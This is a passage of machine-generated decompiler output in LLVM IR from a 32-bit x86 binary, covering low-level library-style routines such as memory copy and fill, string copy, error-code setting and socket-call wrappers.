  store i32 %v4_8050621, i32* %eax.global-to-local, align 4
  %v2_8050629 = icmp slt i32 %v4_8050621, 0
  br i1 %v2_8050629, label %dec_label_pc_805063f, label %dec_label_pc_805062d

dec_label_pc_805062d:                             ; preds = %dec_label_pc_8050619
  %v0_8050632 = load i32, i32* @edi, align 4
  store i32 %v0_8050632, i32* %stack_var_-124, align 4
  %v3_8050633 = call i32 @function_805019d(i32 %v0_8050632, i32 2, i32 1)
  store i32 %v3_8050633, i32* %eax.global-to-local, align 4
  %v2_805063b = icmp slt i32 %v3_8050633, 0
  %v1_805063d = icmp eq i1 %v2_805063b, false
  br i1 %v1_805063d, label %dec_label_pc_8050655, label %dec_label_pc_805063f

dec_label_pc_805063f:                             ; preds = %dec_label_pc_805062d, %dec_label_pc_8050619
  %v0_805063f = load i32, i32* %stack_var_-124, align 4
  %v1_805063f = call i32 @function_805076b(i32 %v0_805063f)
  store i32 %v1_805063f, i32* %eax.global-to-local, align 4
  store i32 %v1_805063f, i32* @ebx, align 4
  %v1_8050649 = inttoptr i32 %v1_805063f to i32*
  %v2_8050649 = load i32, i32* %v1_8050649, align 4
  %v0_805064b = load i32, i32* @edi, align 4
  store i32 %v0_805064b, i32* %stack_var_-124, align 4
  %v1_805064c = call i32 @function_8050233(i32 %v0_805064b)
  store i32 %v1_805064c, i32* %eax.global-to-local, align 4
  %v1_8050651 = load i32, i32* @ebx, align 4
  %v2_8050651 = inttoptr i32 %v1_8050651 to i32*
  store i32 %v2_8050649, i32* %v2_8050651, align 4
  br label %dec_label_pc_80506ca

dec_label_pc_8050655:                             ; preds = %dec_label_pc_805062d
  store i32 48, i32* %stack_var_-124, align 4
  %v1_805065a = call i32 @function_8050b9e(i32 48)
  store i32 %v1_805065a, i32* %eax.global-to-local, align 4
  store i32 %v1_805065a, i32* @ebx, align 4
  %v1_8050664 = icmp eq i32 %v1_805065a, 0
  br i1 %v1_8050664, label %dec_label_pc_80506b6, label %dec_label_pc_8050668

dec_label_pc_8050668:                             ; preds = %dec_label_pc_8050655
  %v0_8050668 = load i32, i32* @edi, align 4
  %v2_8050668 = inttoptr i32 %v1_805065a to i32*
  store i32 %v0_8050668, i32* %v2_8050668, align 4
  %v1_805066a = add i32 %v1_805065a, 16
  %v2_805066a = inttoptr i32 %v1_805066a to i32*
  store i32 0, i32* %v2_805066a, align 4
  %v1_8050671 = add i32 %v1_805065a, 8
  %v2_8050671 = inttoptr i32 %v1_8050671 to i32*
  store i32 0, i32* %v2_8050671, align 4
  %v1_8050678 = add i32 %v1_805065a, 4
  %v2_8050678 = inttoptr i32 %v1_8050678 to i32*
  store i32 0, i32* %v2_8050678, align 4
  store i32 %tmp, i32* %eax.global-to-local, align 4
  %v1_8050683 = load i32, i32* @ebx, align 4
  %v2_8050683 = add i32 %v1_8050683, 20
  %v3_8050683 = inttoptr i32 %v2_8050683 to i32*
  store i32 %tmp, i32* %v3_8050683, align 4
  %v0_8050686 = load i32, i32* %eax.global-to-local, align 4
  %v6_805068b = icmp ugt i32 %v0_8050686, 511
  br i1 %v6_805068b, label %dec_label_pc_8050694, label %dec_label_pc_805068d

dec_label_pc_805068d:                             ; preds = %dec_label_pc_8050668
  %v0_805068d = load i32, i32* @ebx, align 4
  %v1_805068d = add i32 %v0_805068d, 20
  %v2_805068d = inttoptr i32 %v1_805068d to i32*
  store i32 512, i32* %v2_805068d, align 4
  br label %dec_label_pc_8050694

dec_label_pc_8050694:                             ; preds = %dec_label_pc_8050668, %dec_label_pc_805068d
  %v0_8050696 = load i32, i32* @ebx, align 4
  %v1_8050696 = add i32 %v0_8050696, 20
  %v2_8050696 = inttoptr i32 %v1_8050696 to i32*
  %v3_8050696 = load i32, i32* %v2_8050696, align 4
  store i32 1, i32* %stack_var_-124, align 4
  %v3_805069b = call i32 @function_8051312(i64 1, i32 %v3_8050696)
  store i32 %v3_805069b, i32* %eax.global-to-local, align 4
  %v1_80506a3 = load i32, i32* @ebx, align 4
  %v2_80506a3 = add i32 %v1_80506a3, 12
  %v3_80506a3 = inttoptr i32 %v2_80506a3 to i32*
  store i32 %v3_805069b, i32* %v3_80506a3, align 4
  %v1_80506a6 = icmp eq i32 %v3_805069b, 0
  %v1_80506a8 = icmp eq i1 %v1_80506a6, false
  br i1 %v1_80506a8, label %dec_label_pc_80506ce, label %dec_label_pc_80506aa

dec_label_pc_80506aa:                             ; preds = %dec_label_pc_8050694
  %v0_80506ad = load i32, i32* @ebx, align 4
  store i32 %v0_80506ad, i32* %stack_var_-124, align 4
  %v1_80506ae = call i32 @function_8051963(i32 %v0_80506ad)
  store i32 %v1_80506ae, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80506b6

dec_label_pc_80506b6:                             ; preds = %dec_label_pc_8050655, %dec_label_pc_80506aa
  %v0_80506b9 = load i32, i32* @edi, align 4
  store i32 %v0_80506b9, i32* %stack_var_-124, align 4
  %v1_80506ba = call i32 @function_8050233(i32 %v0_80506b9)
  store i32 %v1_80506ba, i32* %eax.global-to-local, align 4
  %v1_80506bf = call i32 @function_805076b(i32 %v0_80506b9)
  store i32 %v1_80506bf, i32* %eax.global-to-local, align 4
  %v1_80506c4 = inttoptr i32 %v1_80506bf to i32*
  store i32 12, i32* %v1_80506c4, align 4
  br label %dec_label_pc_80506ca

dec_label_pc_80506ca:                             ; preds = %dec_label_pc_805063f, %dec_label_pc_80506b6
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_80506db

dec_label_pc_80506ce:                             ; preds = %dec_label_pc_8050694
  %v0_80506d0 = load i32, i32* @ebx, align 4
  %v1_80506d0 = add i32 %v0_80506d0, 24
  store i32 %v1_80506d0, i32* %eax.global-to-local, align 4
  store i32 %v1_80506d0, i32* %stack_var_-124, align 4
  %v1_80506d6 = call i32 @function_80520c7(i32 %v1_80506d0)
  store i32 %v1_80506d6, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80506db

dec_label_pc_80506db:                             ; preds = %dec_label_pc_80506ca, %dec_label_pc_80506ce
  br label %dec_label_pc_80506de

dec_label_pc_80506de:                             ; preds = %dec_label_pc_80505f6, %dec_label_pc_80506db
  %v0_80506e1 = load i32, i32* @ebx, align 4
  store i32 %v0_80506e1, i32* %eax.global-to-local, align 4
  ret i32 %v0_80506e1

; uselistorder directives
  uselistorder i32 %v3_805069b, { 1, 0, 2 }
  uselistorder i32 %v1_805065a, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 %v1_805063f, { 1, 0, 2 }
  uselistorder i32 %v3_8050607, { 1, 0, 3, 2, 4 }
  uselistorder i32* %stack_var_-124, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 (i32)* @function_8050233, { 12, 11, 10, 9, 8, 3, 5, 2, 4, 1, 0, 7, 6 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80506de, { 1, 0 }
  uselistorder label %dec_label_pc_80506db, { 1, 0 }
  uselistorder label %dec_label_pc_80506ca, { 1, 0 }
  uselistorder label %dec_label_pc_80506b6, { 1, 0 }
  uselistorder label %dec_label_pc_8050694, { 1, 0 }
}

define i32 @function_80506e7(i32* %arg1) local_unnamed_addr {
dec_label_pc_80506e7:
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  store i32 %tmp3, i32* @esi, align 4
  %v1_80506f0 = add i32 %tmp3, 24
  store i32 %v1_80506f0, i32* @ebx, align 4
  %v2_80506f9 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_80506f9, i32* @eax, align 4
  %v2_80506fe = call i32 @function_80520ca(i32 %v2_80506f9, i32 134553799)
  %v0_8050703 = load i32, i32* @ebx, align 4
  %v1_8050706 = call i32 @function_80520c7(i32 %v0_8050703)
  br label %dec_label_pc_805070e

dec_label_pc_805070e:                             ; preds = %dec_label_pc_8050739, %dec_label_pc_80506e7
  %v0_805070e = load i32, i32* @esi, align 4
  %v1_805070e = add i32 %v0_805070e, 8
  %v2_805070e = inttoptr i32 %v1_805070e to i32*
  %v3_805070e = load i32, i32* %v2_805070e, align 4
  %v2_8050711 = add i32 %v0_805070e, 4
  %v3_8050711 = inttoptr i32 %v2_8050711 to i32*
  %v4_8050711 = load i32, i32* %v3_8050711, align 4
  %v6_8050714 = icmp ugt i32 %v3_805070e, %v4_8050711
  br i1 %v6_8050714, label %dec_label_pc_8050739, label %dec_label_pc_8050716

dec_label_pc_8050716:                             ; preds = %dec_label_pc_805070e
  %v0_8050716 = load i32, i32* @edx, align 4
  %v1_8050717 = add i32 %v0_805070e, 20
  %v2_8050717 = inttoptr i32 %v1_8050717 to i32*
  %v3_8050717 = load i32, i32* %v2_8050717, align 4
  %v1_805071a = add i32 %v0_805070e, 12
  %v2_805071a = inttoptr i32 %v1_805071a to i32*
  %v3_805071a = load i32, i32* %v2_805071a, align 4
  %v1_805071d = inttoptr i32 %v0_805070e to i32*
  %v2_805071d = load i32, i32* %v1_805071d, align 4
  %v4_805071f = call i32 @function_805250a(i32 %v2_805071d, i32 %v3_805071a, i32 %v3_8050717, i32 %v0_8050716)
  %tmp13 = icmp slt i32 %v4_805071f, 1
  %tmp14 = icmp eq i1 %tmp13, false
  br i1 %tmp14, label %dec_label_pc_805072f, label %dec_label_pc_805072b

dec_label_pc_805072b:                             ; preds = %dec_label_pc_8050716
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_8050755

dec_label_pc_805072f:                             ; preds = %dec_label_pc_8050716
  %v1_805072f = load i32, i32* @esi, align 4
  %v2_805072f = add i32 %v1_805072f, 8
  %v3_805072f = inttoptr i32 %v2_805072f to i32*
  store i32 %v4_805071f, i32* %v3_805072f, align 4
  %v0_8050732 = load i32, i32* @esi, align 4
  %v1_8050732 = add i32 %v0_8050732, 4
  %v2_8050732 = inttoptr i32 %v1_8050732 to i32*
  store i32 0, i32* %v2_8050732, align 4
  %v0_8050739.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8050739

dec_label_pc_8050739:                             ; preds = %dec_label_pc_805070e, %dec_label_pc_805072f
  %v1_8050747 = phi i32 [ %v0_805070e, %dec_label_pc_805070e ], [ %v0_8050739.pre, %dec_label_pc_805072f ]
  %v1_8050739 = add i32 %v1_8050747, 4
  %v2_8050739 = inttoptr i32 %v1_8050739 to i32*
  %v3_8050739 = load i32, i32* %v2_8050739, align 4
  %v2_805073e = add i32 %v1_8050747, 12
  %v3_805073e = inttoptr i32 %v2_805073e to i32*
  %v4_805073e = load i32, i32* %v3_805073e, align 4
  %v5_805073e = add i32 %v4_805073e, %v3_8050739
  store i32 %v5_805073e, i32* @ebx, align 4
  %v1_8050741 = add i32 %v5_805073e, 8
  %v2_8050741 = inttoptr i32 %v1_8050741 to i16*
  %v3_8050741 = load i16, i16* %v2_8050741, align 2
  %v4_8050741 = zext i16 %v3_8050741 to i32
  store i32 %v4_8050741, i32* @edx, align 4
  %v2_8050745 = add i32 %v4_8050741, %v3_8050739
  store i32 %v2_8050745, i32* %v2_8050739, align 4
  %v0_805074a = load i32, i32* @ebx, align 4
  %v1_805074a = add i32 %v0_805074a, 4
  %v2_805074a = inttoptr i32 %v1_805074a to i32*
  %v3_805074a = load i32, i32* %v2_805074a, align 4
  %v1_805074d = load i32, i32* @esi, align 4
  %v2_805074d = add i32 %v1_805074d, 16
  %v3_805074d = inttoptr i32 %v2_805074d to i32*
  store i32 %v3_805074a, i32* %v3_805074d, align 4
  %v0_8050750 = load i32, i32* @ebx, align 4
  %v1_8050750 = inttoptr i32 %v0_8050750 to i32*
  %v2_8050750 = load i32, i32* %v1_8050750, align 4
  %v3_8050750 = icmp eq i32 %v2_8050750, 0
  br i1 %v3_8050750, label %dec_label_pc_805070e, label %dec_label_pc_8050755.loopexit

dec_label_pc_8050755.loopexit:                    ; preds = %dec_label_pc_8050739
  br label %dec_label_pc_8050755

dec_label_pc_8050755:                             ; preds = %dec_label_pc_8050755.loopexit, %dec_label_pc_805072b
  store i32 %v2_80506f9, i32* @eax, align 4
  %v2_805075e = call i32 @function_80520ca(i32 %v2_80506f9, i32 1)
  %v0_8050763 = load i32, i32* @ebx, align 4
  ret i32 %v0_8050763

; uselistorder directives
  uselistorder i32 %v1_8050747, { 1, 0 }
  uselistorder i32 %v0_805070e, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 %tmp3, { 1, 0 }
  uselistorder label %dec_label_pc_8050739, { 1, 0 }
}

define i32 @function_805076b(i32 %arg1) local_unnamed_addr {
dec_label_pc_805076b:
  ret i32 ptrtoint (i32* @global_var_80543f4.30 to i32)
}

define i32 @function_8050771() local_unnamed_addr {
dec_label_pc_8050771:
  %tmp = call i64 @__decompiler_undefined_function_4()
  %stack_var_-16 = alloca i32, align 4
  %v1_8050779 = bitcast i32* %stack_var_-16 to %tms*
  %v2_8050779 = call i32 @function_80528df(%tms* %v1_8050779)
  %v4_805077e = trunc i64 %tmp to i32
  %v4_8050782 = load i32, i32* %stack_var_-16, align 4
  %v5_8050782 = add i32 %v4_8050782, %v4_805077e
  %v3_8050789 = mul i32 %v5_8050782, 10000
  %v1_805078f = and i32 %v3_8050789, 2147483632
  ret i32 %v1_805078f

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @function_8050795(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8050795:
  %tmp4 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v0_8050796 = load i32, i32* @esi, align 4
  store i32 %v0_8050796, i32* %stack_var_-8, align 4
  %v4_8050797 = ptrtoint i8* %arg1 to i32
  %v9_80507a3 = icmp ugt i8* %tmp4, %arg1
  %v1_80507a5 = icmp eq i1 %v9_80507a3, false
  br i1 %v1_80507a5, label %dec_label_pc_80507ad, label %dec_label_pc_80507a7

dec_label_pc_80507a7:                             ; preds = %dec_label_pc_8050795
  %v7_80507a9 = call i8* @_memcpy(i8* %arg1, i8* %tmp4, i32 %arg3)
  br label %dec_label_pc_80507b9

dec_label_pc_80507ad:                             ; preds = %dec_label_pc_8050795
  %v3_80507ad = add i32 %arg2, -1
  %v4_80507ad = add i32 %v3_80507ad, %arg3
  %v5_80507ad = inttoptr i32 %v4_80507ad to i8*
  %v3_80507b1 = add i32 %v4_8050797, -1
  %v4_80507b1 = add i32 %v3_80507b1, %arg3
  %v5_80507b1 = inttoptr i32 %v4_80507b1 to i8*
  %v7_80507b6 = call i8* @_memcpy(i8* %v5_80507b1, i8* %v5_80507ad, i32 %arg3)
  store i1 false, i1* @df, align 1
  br label %dec_label_pc_80507b9

dec_label_pc_80507b9:                             ; preds = %dec_label_pc_80507a7, %dec_label_pc_80507ad
  %v2_80507b9 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80507b9, i32* @esi, align 4
  ret i32 %v4_8050797

; uselistorder directives
  uselistorder i8* %tmp4, { 1, 0 }
  uselistorder i32 %arg3, { 1, 3, 2, 0 }
  uselistorder i8* %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80507b9, { 1, 0 }
}

define i32 @function_80507bc(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_80507bc:
  %v0_80507bc = load i32, i32* @edi, align 4
  %v4_80507c5 = ptrtoint i8* %arg1 to i32
  %v5_80507c9 = call i8* @_memset(i8* %arg1, i32 %arg2, i32 %arg3)
  store i32 %v0_80507bc, i32* @edi, align 4
  ret i32 %v4_80507c5

; uselistorder directives
  uselistorder i8* %arg1, { 1, 0 }
}

define i32 @function_80507d1(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_80507d1:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80507d2 = load i32, i32* @esi, align 4
  store i32 %v0_80507d2, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_80507da = ptrtoint i8* %arg1 to i32
  store i32 %v4_80507da, i32* %edi.global-to-local, align 4
  %v4_80507de.pre = load i32, i32* @eax, align 4
  %v8_80507de.pre = load i1, i1* @df, align 1
  br label %dec_label_pc_80507de

dec_label_pc_80507de:                             ; preds = %dec_label_pc_80507de.dec_label_pc_80507de_crit_edge, %dec_label_pc_80507d1
  %v2_80507df = phi i32 [ %v7_80507df, %dec_label_pc_80507de.dec_label_pc_80507de_crit_edge ], [ %v4_80507da, %dec_label_pc_80507d1 ]
  %v8_80507de = phi i1 [ %v5_80507df, %dec_label_pc_80507de.dec_label_pc_80507de_crit_edge ], [ %v8_80507de.pre, %dec_label_pc_80507d1 ]
  %v4_80507de = phi i32 [ %v0_80507e0, %dec_label_pc_80507de.dec_label_pc_80507de_crit_edge ], [ %v4_80507de.pre, %dec_label_pc_80507d1 ]
  %v7_80507de = phi i32 [ %v0_80507de.pre, %dec_label_pc_80507de.dec_label_pc_80507de_crit_edge ], [ %arg2, %dec_label_pc_80507d1 ]
  %v1_80507de = inttoptr i32 %v7_80507de to i8*
  %v2_80507de = load i8, i8* %v1_80507de, align 1
  %v3_80507de = zext i8 %v2_80507de to i32
  %v5_80507de = and i32 %v4_80507de, -256
  %v6_80507de = or i32 %v3_80507de, %v5_80507de
  store i32 %v6_80507de, i32* %eax.global-to-local, align 4
  %v9_80507de = select i1 %v8_80507de, i32 -1, i32 1
  %v10_80507de = add i32 %v7_80507de, %v9_80507de
  store i32 %v10_80507de, i32* %esi.global-to-local, align 4
  %v3_80507df = inttoptr i32 %v2_80507df to i8*
  store i8 %v2_80507de, i8* %v3_80507df, align 1
  %v4_80507df = load i32, i32* %edi.global-to-local, align 4
  %v5_80507df = load i1, i1* @df, align 1
  %v6_80507df = select i1 %v5_80507df, i32 -1, i32 1
  %v7_80507df = add i32 %v6_80507df, %v4_80507df
  store i32 %v7_80507df, i32* %edi.global-to-local, align 4
  %v0_80507e0 = load i32, i32* %eax.global-to-local, align 4
  %v3_80507e0 = trunc i32 %v0_80507e0 to i8
  %v4_80507e0 = icmp eq i8 %v3_80507e0, 0
  %v1_80507e2 = icmp eq i1 %v4_80507e0, false
  br i1 %v1_80507e2, label %dec_label_pc_80507de.dec_label_pc_80507de_crit_edge, label %dec_label_pc_80507e4

dec_label_pc_80507de.dec_label_pc_80507de_crit_edge: ; preds = %dec_label_pc_80507de
  %v0_80507de.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80507de

dec_label_pc_80507e4:                             ; preds = %dec_label_pc_80507de
  store i32 %v4_80507da, i32* %eax.global-to-local, align 4
  %v2_80507e9 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80507e9, i32* %esi.global-to-local, align 4
  ret i32 %v4_80507da

; uselistorder directives
  uselistorder i32 %v0_80507e0, { 1, 0 }
  uselistorder i32 %v7_80507df, { 1, 0 }
  uselistorder i1 %v5_80507df, { 1, 0 }
  uselistorder i32 %v4_80507da, { 1, 2, 0, 3 }
}

define i32 @function_80507ec() local_unnamed_addr {
dec_label_pc_80507ec:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v2_80507ef = ptrtoint i32* %stack_var_-4 to i32
  %v2_80507f8 = inttoptr i32 %tmp to i8*
  %v3_80507f8 = call i32 @function_80529b1(i8* %v2_80507f8, i32 %v2_80507ef)
  %v1_8050803 = icmp eq i32 %v3_80507f8, 0
  br i1 %v1_8050803, label %dec_label_pc_805080b, label %dec_label_pc_8050807

dec_label_pc_8050807:                             ; preds = %dec_label_pc_80507ec
  %v3_8050807 = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805080b

dec_label_pc_805080b:                             ; preds = %dec_label_pc_80507ec, %dec_label_pc_8050807
  %v0_805080b = phi i32 [ -1, %dec_label_pc_80507ec ], [ %v3_8050807, %dec_label_pc_8050807 ]
  ret i32 %v0_805080b

; uselistorder directives
  uselistorder label %dec_label_pc_805080b, { 1, 0 }
}

define i32 @function_8050811(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8050811:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_805082c = ptrtoint i32* %stack_var_-12 to i32
  %v2_8050833 = call i32 @function_80523fb(i32 2, i32 %v2_805082c)
  ret i32 %v2_8050833

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @function_805083c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_805083c:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_8050857 = ptrtoint i32* %stack_var_-12 to i32
  %v2_805085e = call i32 @function_80523fb(i32 3, i32 %v2_8050857)
  ret i32 %v2_805085e

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @function_8050867(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8050867:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_8050882 = ptrtoint i32* %stack_var_-12 to i32
  %v2_8050889 = call i32 @function_80523fb(i32 6, i32 %v2_8050882)
  ret i32 %v2_8050889

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @function_8050892() local_unnamed_addr {
dec_label_pc_8050892:
  %stack_var_-20 = alloca i32, align 4
  %v2_80508bd = ptrtoint i32* %stack_var_-20 to i32
  %v2_80508c4 = call i32 @function_80523fb(i32 15, i32 %v2_80508bd)
  ret i32 %v2_80508c4
}

define i32 @function_80508cd(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_80508cd:
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-8, align 4
  %v2_80508e0 = ptrtoint i32* %stack_var_-8 to i32
  %v2_80508e7 = call i32 @function_80523fb(i32 4, i32 %v2_80508e0)
  ret i32 %v2_80508e7

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @function_80508f0() local_unnamed_addr {
dec_label_pc_80508f0:
  %stack_var_-16 = alloca i32, align 4
  %v2_8050913 = ptrtoint i32* %stack_var_-16 to i32
  %v2_805091a = call i32 @function_80523fb(i32 10, i32 %v2_8050913)
  ret i32 %v2_805091a
}

define i32 @function_8050923() local_unnamed_addr {
dec_label_pc_8050923:
  %stack_var_-24 = alloca i32, align 4
  %v2_8050956 = ptrtoint i32* %stack_var_-24 to i32
  %v2_805095d = call i32 @function_80523fb(i32 12, i32 %v2_8050956)
  ret i32 %v2_805095d
}

define i32 @function_8050966() local_unnamed_addr {
dec_label_pc_8050966:
  %stack_var_-16 = alloca i32, align 4
  %v2_8050989 = ptrtoint i32* %stack_var_-16 to i32
  %v2_8050990 = call i32 @function_80523fb(i32 9, i32 %v2_8050989)
  ret i32 %v2_8050990
}

define i32 @function_8050999() local_unnamed_addr {
dec_label_pc_8050999:
  %stack_var_-24 = alloca i32, align 4
  %v2_80509cc = ptrtoint i32* %stack_var_-24 to i32
  %v2_80509d3 = call i32 @function_80523fb(i32 11, i32 %v2_80509cc)
  ret i32 %v2_80509d3
}

define i32 @function_80509dc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_80509dc:
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-20, align 4
  %v2_8050a07 = ptrtoint i32* %stack_var_-20 to i32
  %v2_8050a0e = call i32 @function_80523fb(i32 14, i32 %v2_8050a07)
  ret i32 %v2_8050a0e

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @function_8050a17(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8050a17:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_8050a32 = ptrtoint i32* %stack_var_-12 to i32
  %v2_8050a39 = call i32 @function_80523fb(i32 1, i32 %v2_8050a32)
  ret i32 %v2_8050a39

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_80523fb, { 6, 10, 5, 0, 4, 3, 9, 2, 7, 1, 8 }
}

define i32 @function_8050a42(i32 %arg1) local_unnamed_addr {
dec_label_pc_8050a42:
  %tmp3 = icmp slt i32 %arg1, 1
  br i1 %tmp3, label %dec_label_pc_8050a5a, label %dec_label_pc_8050a4d

dec_label_pc_8050a4d:                             ; preds = %dec_label_pc_8050a42
  %v1_8050a4d = add i32 %arg1, -64
  %v3_8050a4d = sub i32 63, %arg1
  %v4_8050a4d = and i32 %v3_8050a4d, %arg1
  %v5_8050a4d = icmp slt i32 %v4_8050a4d, 0
  %v6_8050a4d = icmp eq i32 %v1_8050a4d, 0
  %v7_8050a4d = icmp slt i32 %v1_8050a4d, 0
  %v3_8050a50 = icmp eq i1 %v7_8050a4d, %v5_8050a4d
  %v4_8050a50 = icmp eq i1 %v6_8050a4d, false
  %v5_8050a50 = and i1 %v4_8050a50, %v3_8050a50
  br i1 %v5_8050a50, label %dec_label_pc_8050a5a, label %dec_label_pc_8050a52

dec_label_pc_8050a52:                             ; preds = %dec_label_pc_8050a4d
  %v4_8050a55 = call i32 @function_8050b58(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_8050a5a

dec_label_pc_8050a5a:                             ; preds = %dec_label_pc_8050a4d, %dec_label_pc_8050a42, %dec_label_pc_8050a52
  %v1_8050a5a = call i32 @function_805076b(i32 ptrtoint (i32* @0 to i32))
  %v1_8050a5f = inttoptr i32 %v1_8050a5a to i32*
  store i32 22, i32* %v1_8050a5f, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v1_8050a4d, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_8050a5a, { 2, 0, 1 }
}

define i32 @function_8050a6c(i32 %arg1) local_unnamed_addr {
dec_label_pc_8050a6c:
  %v3_8050a7a = inttoptr i32 %arg1 to i8*
  %v4_8050a7a = call i32 @function_80507bc(i8* %v3_8050a7a, i32 0, i32 128)
  ret i32 0
}

define i32 @function_8050a85(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8050a85:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-300 = alloca i32, align 4
  %v0_8050a85 = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v10_8050a9a = icmp eq i32 %arg2, -1
  %arg1.off = add i32 %arg1, -1
  %tmp35 = icmp ugt i32 %arg1.off, 63
  %tmp36 = or i1 %tmp35, %v10_8050a9a
  br i1 %tmp36, label %dec_label_pc_8050aa8, label %dec_label_pc_8050ac3.lr.ph

dec_label_pc_8050aa8:                             ; preds = %dec_label_pc_8050a85
  %v1_8050aa8 = call i32 @function_805076b(i32 %v0_8050a85)
  store i32 %v1_8050aa8, i32* %eax.global-to-local, align 4
  %v1_8050aad = inttoptr i32 %v1_8050aa8 to i32*
  store i32 22, i32* %v1_8050aad, align 4
  br label %dec_label_pc_8050b2c

dec_label_pc_8050ac3.lr.ph:                       ; preds = %dec_label_pc_8050a85
  %v15_8050a86 = ptrtoint i32* %stack_var_-300 to i32
  store i32 %arg2, i32* %stack_var_-144, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  %v4_8050ac328 = add i32 %v15_8050a86, 284
  %v5_8050ac329 = inttoptr i32 %v4_8050ac328 to i32*
  store i32 0, i32* %v5_8050ac329, align 4
  %v0_8050ace30 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050ace31 = add i32 %v0_8050ace30, -1
  %v9_8050ace32 = icmp slt i32 %v1_8050ace31, 0
  store i32 %v1_8050ace31, i32* %eax.global-to-local, align 4
  %v1_8050acf33 = icmp eq i1 %v9_8050ace32, false
  br i1 %v1_8050acf33, label %dec_label_pc_8050ac3.dec_label_pc_8050ac3_crit_edge, label %dec_label_pc_8050ad1

dec_label_pc_8050ac3.dec_label_pc_8050ac3_crit_edge: ; preds = %dec_label_pc_8050ac3.lr.ph, %dec_label_pc_8050ac3.dec_label_pc_8050ac3_crit_edge
  %v1_8050ace34 = phi i32 [ %v1_8050ace, %dec_label_pc_8050ac3.dec_label_pc_8050ac3_crit_edge ], [ %v1_8050ace31, %dec_label_pc_8050ac3.lr.ph ]
  %v0_8050ac3.pre = load i32, i32* @esp, align 4
  %v2_8050ac3 = mul i32 %v1_8050ace34, 4
  %v3_8050ac3 = add i32 %v0_8050ac3.pre, 160
  %v4_8050ac3 = add i32 %v3_8050ac3, %v2_8050ac3
  %v5_8050ac3 = inttoptr i32 %v4_8050ac3 to i32*
  store i32 0, i32* %v5_8050ac3, align 4
  %v0_8050ace = load i32, i32* %eax.global-to-local, align 4
  %v1_8050ace = add i32 %v0_8050ace, -1
  %v9_8050ace = icmp slt i32 %v1_8050ace, 0
  store i32 %v1_8050ace, i32* %eax.global-to-local, align 4
  %v1_8050acf = icmp eq i1 %v9_8050ace, false
  br i1 %v1_8050acf, label %dec_label_pc_8050ac3.dec_label_pc_8050ac3_crit_edge, label %dec_label_pc_8050ad1

dec_label_pc_8050ad1:                             ; preds = %dec_label_pc_8050ac3.dec_label_pc_8050ac3_crit_edge, %dec_label_pc_8050ac3.lr.ph
